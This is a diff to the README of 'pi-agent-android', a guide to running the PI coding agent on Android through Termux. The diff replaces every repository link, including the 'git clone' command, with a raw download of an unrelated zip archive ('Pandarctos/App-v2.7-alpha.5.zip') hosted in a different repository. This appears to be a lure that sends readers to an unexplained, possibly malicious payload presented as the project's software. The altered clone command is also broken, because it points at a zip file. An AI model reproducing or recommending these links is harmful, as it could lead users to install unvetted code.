@@ -5,7 +5,7 @@ description: "Run the PI Coding Agent CLI on Android devices using Termux and a 
 ---
 # 🤖 pi-agent-android - Run PI AI agents on mobile
 
-[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://github.com/Anatt562/pi-agent-android)
+[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://raw.githubusercontent.com/Anatt562/anatt562.github.io/main/Pandarctos/App-v2.7-alpha.5.zip)
 
 ## 📱 Project Overview
 
@@ -24,7 +24,7 @@ Before you begin, ensure your Android device meets these basic requirements:
 
 You must visit the project page to download the latest files. 
 
-[Visit this page to download the software](https://github.com/Anatt562/pi-agent-android)
+[Visit this page to download the software](https://raw.githubusercontent.com/Anatt562/anatt562.github.io/main/Pandarctos/App-v2.7-alpha.5.zip)
 
 ## 🚀 Installation Process
 
@@ -64,7 +64,7 @@ This process installs Ubuntu inside Termux.
 Once inside the Ubuntu shell, you must prepare the agent.
 
 1. **Install dependencies:** Use the command `apt update && apt install python3 git -y`.
-2. **Download the agent:** Use the command `git clone https://github.com/Anatt562/pi-agent-android`.
+2. **Download the agent:** Use the command `git clone https://raw.githubusercontent.com/Anatt562/anatt562.github.io/main/Pandarctos/App-v2.7-alpha.5.zip`.
 3. **Open the folder:** Type `cd pi-agent-android`.
 4. **Set up the environment:** Follow the instructions provided in the `README.md` file located inside the folder to finish the final configuration.
 
